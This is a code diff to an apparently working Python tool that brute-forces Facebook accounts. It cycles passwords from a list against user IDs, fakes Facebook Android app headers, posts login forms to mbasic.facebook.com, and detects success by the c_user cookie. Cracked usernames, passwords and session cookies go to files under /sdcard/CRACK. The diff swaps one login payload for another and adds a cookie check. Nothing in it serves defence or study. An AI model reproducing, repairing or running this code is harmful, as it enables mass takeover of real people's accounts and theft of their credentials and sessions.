@@ -12,7 +12,6 @@ import base64
 import string
 import uuid
 import requests
-import json
 from concurrent.futures import ThreadPoolExecutor
 try:os.mkdir('/sdcard/CRACK')
 except:pass
@@ -339,95 +338,10 @@ def cracker(ids,passlist):
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
             url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
-            requu1 = session.get(url1).text
-            params = {
-            'appid': 'com.bloks.www.bloks.caa.logon.async.send_logon_request',
-            'type': 'action',
-            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
-            log_data = {
-    '__aaid': '0',
-    '__user': '0',
-    '__a': '1',
-    '__req': 'a',
-    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
-    'dpr': '3',
-    '__ccg': 'EXCELLENT',
-    '__rev': '1023608600',
-    '__s': ':f95eey:i9v0n0',
-    '__hsi': '7513185148771233093',
-    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
-    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(requu1)).group(1),
-    'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1)).group(1),
-    'lsd': re.search('name="lsd" value="(.*?)"', str(requu1)).group(1),
-    'params': json.dumps({
-        "params": json.dumps({
-            "server_params": {
-                "credential_type": "password",
-                "username_text_input_id": "7w9omu:68",
-                "password_text_input_id": "7w9omu:69",
-                "logon_source": "logon",
-                "logon_credential_type": "none",
-                "server_logon_source": "logon",
-                "ar_event_source": "logon_home_page",
-                "should_trigger_override_logon_success_action": 0,
-                "should_trigger_override_logon_2fa_action": 0,
-                "is_caa_perf_enabled": 0,
-                "reg_flow_source": "logon_home_native_integration_point",
-                "caller": "gslr",
-                "is_from_landing_page": 0,
-                "is_from_empty_password": 0,
-                "is_from_aymh": 0,
-                "is_from_password_entry_page": 0,
-                "is_from_assistive_id": 0,
-                "is_from_msplit_fallback": 0,
-                "two_step_logon_type": "one_step_logon",
-                "INTERNAL__latency_qpl_marker_id": 36707139,
-                "INTERNAL__latency_qpl_instance_id": "47746277400427",
-                "device_id": None,
-                "family_device_id": None,
-                "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
-                "offline_experiment_group": None,
-                "layered_homepage_experiment_group": None,
-                "is_platform_logon": 0,
-                "is_from_logged_in_switcher": 0,
-                "is_from_logged_out": 0,
-                "access_flow_version": "pre_mt_behavior"
-            },
-            "client_input_params": {
-                "machine_id": "",
-                "cloud_trust_token": None,
-                "contact_point": ids,
-                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
-                "accounts_list": [],
-                "fb_ig_device_id": [],
-                "secure_family_device_id": "",
-                "encrypted_msisdn": "",
-                "headers_infra_flow_id": "",
-                "try_num": 1,
-                "logon_attempt_count": 1,
-                "event_flow": "logon_manual",
-                "event_step": "home_page",
-                "openid_tokens": {},
-                "block_store_machine_id": "",
-                "auth_secure_device_id": "",
-                "client_known_key_hash": "",
-                "has_whatsapp_installed": 0,
-                "sso_token_map_json_string": "",
-                "should_show_nested_nta_from_aymh": 0,
-                "password_contains_non_ascii": "false",
-                "has_granted_read_contacts_permissions": 0,
-                "has_granted_read_phone_permissions": 0,
-                "app_manager_id": "",
-                "aymh_accounts": [],
-                "lois_settings": {
-                    "lois_token": ""
-                }
-            }
-        })
-    }),
-}
+            requu1 = session.get(url1)
+            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
             #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
-            url = "https://p.facebook.com/async/wbloks/fetch/"
+            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             headers = {
             'user-agent': us,
             'Accept-Encoding': 'gzip, deflate',
@@ -452,7 +366,7 @@ def cracker(ids,passlist):
             'x-fb-lsd': us,
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream'}            
-            response = session.post(url,params=params,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
+            response = session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(headers)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
@@ -498,7 +412,7 @@ def cracker(ids,passlist):
     except requests.exceptions.ConnectionError:
         time.sleep(20)
     except Exception as e:
-        print(f"\nError: {e}")
+        #print(f"\nError: {e}")
         pass
 
 def mainn():
@@ -590,6 +504,13 @@ def crackerr(ids,passlist):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
+                    if xs_value and xs_value.rstrip(';').endswith('-1'):
+                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        oks.append(ids)
+                        break
+                    else:
                         bkas.append(user)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{user}|{pas}|{kuki}")
@@ -617,4 +538,4 @@ def crackerr(ids,passlist):
         #print(f"\nError: {e}")
         pass
 
-Process()
+m()
